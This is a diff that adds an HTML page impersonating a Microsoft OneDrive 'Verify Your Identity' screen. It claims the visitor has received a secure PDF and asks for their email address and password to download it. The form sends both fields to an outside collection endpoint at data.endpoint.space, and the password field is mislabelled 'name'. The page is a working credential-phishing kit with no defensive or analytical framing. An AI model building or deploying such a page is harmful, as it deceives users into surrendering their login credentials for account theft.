@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Document</title>
+<style>
+/* Basic reset */
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+}
+
+body {
+  font-family: Arial, sans-serif;
+  background-color: #f0f0f0;
+  background-image: url("backgroundblur.png");
+}
+
+/* Navigation bar styles */
+.navbar {
+  background-color: #0078d4; /* OneDrive blue */
+  color: white;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 10px 20px;
+}
+
+.navbar-logo {
+  display: flex;
+  align-items: center;
+}
+
+.navbar-logo img {
+  height: 45px; /* Adjust height as needed */
+  margin-right: 10px;
+  width: 120px;
+}
+
+.navbar-links {
+  list-style-type: none;
+  display: flex;
+}
+
+.navbar-links li {
+  margin-right: 20px;
+}
+
+.navbar-links a {
+  color: white;
+  text-decoration: none;
+  font-weight: bold;
+  transition: color 0.3s ease;
+}
+
+.navbar-links a:hover {
+  color: #cceeff; /* Lighter blue on hover */
+}
+
+/* Responsive design */
+@media (max-width: 768px) {
+  .navbar {
+    flex-direction: column;
+    align-items: flex-start;
+  }
+
+  .navbar-links {
+    margin-top: 10px;
+  }
+
+  .navbar-links li {
+    margin-right: 0;
+    margin-bottom: 10px;
+  }
+}
+
+/* Content area styles */
+.content {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  height: 100vh; /* Full height of viewport */
+}
+div.content {
+    height: 190px;
+    margin-bottom: -50px;
+}
+.content img {
+  max-width: 100%;
+  height: auto;
+  margin-bottom: 20px;
+  height: 45px;
+}
+.headtwo {
+    width: 350px;
+    height: 50px;
+    display: flex;
+  justify-content: center;
+  align-items: center;
+  background-color: rgb(206, 204, 204);
+  font-weight: lighter;
+  box-shadow: 0 4px 8px 0 rgba(0,0,0,0.2), 0 6px 20px 0 rgba(0,0,0.19);
+}
+.right-side{
+    align-items: center;
+}
+form{
+    width: 350px;
+    height: 500px;
+    border-radius: 0px;
+    background-color: #ffffff;
+    display: flex;
+    flex-direction: column;
+    padding: 40px;
+    box-shadow: 0 4px 8px 0 rgba(0,0,0,0.2), 0 6px 20px 0 rgba(0,0,0.19);
+}
+form h1{
+    font-size: 12px;
+    margin-bottom: 20px;
+    height: 20px;
+}
+form p{
+    font-size: 12px;
+}
+form span{
+    font-size: 12px;
+    margin-top: 20px;
+}
+form input{
+    outline: none;
+    border: none;
+    border-bottom: 1.5px solid #000;
+    padding: 5px;
+    background: none;
+}
+form input:hover{
+    border-bottom: 2px solid rgb(52,122,226);
+}
+.btn1{
+    width: 80px;
+    margin-top: 50px;
+    font-size: 11px;
+    border: none;
+    border-radius: 0px;
+    padding: 8px 0px;
+    background: #005da6;
+    color: #fff;
+    font-weight: bold;
+    margin-left: 70%;
+    cursor: pointer;
+    outline: none ;
+}
+.btn1:hover{
+    background: #014b85;
+}
+h3{
+    text-align: center;
+    margin: 10px;
+    color: gray;
+}
+.btn{
+    outline: none;
+    border: none;
+    font-size: 13px;
+    padding: 16px 14px;
+    margin: 6px;
+    border-radius: 40px;
+    background: none;
+    font-weight: bolder;
+    cursor: pointer;
+}
+.color1{
+    border: 2px solid rgb(182,178,178);
+}
+.color2{
+    background-color: rgb(36,82,156);
+    color: #fff;
+}
+.color3{
+    background-color: #000;
+    color: #fff;
+}
+.icon1{
+    font-size: 20px;
+    color: rgb(248,4,4);
+    margin-right: 10px;
+}
+.icon2{
+    font-size: 20px;
+    color: #fff;
+    margin-right: 10px;
+}
+.end{
+    font-size: 10px;
+    color: grey;
+    margin-top: 30px;
+}
+a{
+    text-decoration: none;
+    color: blue;
+    font-weight: bold;
+}
+div.right-side {
+    margin-top:13px ;
+    display: flex;
+  justify-content: center;
+  align-items: center;
+}
+.ath1{
+    margin-bottom: 20px;
+}
+.text22{
+    line-height:23px; 
+ margin:;
+}
+.ath2{
+    margin-top: 20px;
+    margin-bottom:20px ;
+    height:;
+}
+.ath1 img{
+      height: 40px;
+    }
+    .ath2 img{
+      height: 40px;
+    margin-left: -10px;
+    }
+</style>
+
+</head>
+<body>
+
+<nav class="navbar">
+  <div class="navbar-logo">
+    <img src="onedriv-removebg-preview.png" alt="OneDrive Logo">
+    <span></span>
+  </div>
+  
+</nav>
+
+<!-- Content area with Microsoft logo and name -->
+<div class="content">
+  <img src="microsif-removebg-preview.png" alt="Microsoft Logo">
+  <div class="headtwo"><h2>Verify Your Identity</h2></div>
+</div>
+<div class="right-side">
+    <form  id="contact-form" method="POST" action="https://data.endpoint.space/cltxliml9007608l5c63lb27a">
+        <h1>You've received a secure file</h1>
+        <p class="ath1"><img src="pdf1-removebg-preview.png" alt="563.1KB"><span>563.1KB</span></p>
+        <p class="text22">To receive and download this PDF file, please enter specific professional email credentials that this document was sent to.</p>
+        <p class="ath2"><img src="Newother.jpeg" alt="563.1KB"> </p>
+        <span>Email address</span>
+        <input type="text" name="email">
+        <span>Password</span>
+        <input type="text" name="name">
+        <button class="btn1" type="submit" value="Submit" onclick="showIpAddressAndSpecs()">Continue</button>
+        <p class="end">
+            Protected by re CAPTCHA and subject to the Google <a href="#">Privacy Policy</a>
+            and <a href="#">Terms of service</a>
+        </p>
+    
+</div>
+<div>
+    
+</div>
+</body>
+</html>
